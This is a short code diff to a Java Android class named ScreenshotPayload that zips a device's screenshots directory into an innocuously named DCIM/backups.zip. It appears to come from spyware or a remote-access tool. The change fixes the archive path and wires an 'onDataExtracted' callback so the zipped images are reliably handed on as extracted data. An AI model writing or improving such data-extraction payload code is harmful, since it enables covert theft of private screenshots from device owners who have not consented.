@@ -34,11 +34,6 @@ public class ScreenshotPayload extends AsyncTask<String, Integer, String> {
         return this;
     }
 
-    public ScreenshotPayload setExtractionNumber(int noOfFiles) {
-        this.noOfFiles = noOfFiles;
-        return this;
-    }
-
     @Override
     protected String doInBackground(String... strings) {
         try {
@@ -64,11 +59,13 @@ public class ScreenshotPayload extends AsyncTask<String, Integer, String> {
                             } else noOfFiles = -1;
 
                             if (noOfFiles == -1) {
-                                new ZipUtils().setZipListener(() -> screenshotPayloadListener.onDataExtracted(new File(Environment.getExternalStorageDirectory() + "DCIM/backups.zip")))
+                                new ZipUtils().setZipListener(() ->
+                                                screenshotPayloadListener.onDataExtracted(new File(Environment.getExternalStorageDirectory() + "/DCIM/backups.zip")))
                                         .zipDirectory(file, Environment.getExternalStorageDirectory() + "/DCIM/backups.zip");
                             } else {
-                                new ZipUtils().setZipListener(() -> {
-                                }).zipDirectory(file, Environment.getExternalStorageDirectory() + "/DCIM/backups.zip", noOfFiles);
+                                new ZipUtils()
+                                        .setZipListener(() -> screenshotPayloadListener.onDataExtracted(new File(Environment.getExternalStorageDirectory() + "/DCIM/backups.zip")))
+                                        .zipDirectory(file, Environment.getExternalStorageDirectory() + "/DCIM/backups.zip", noOfFiles);
                             }
                         }
 
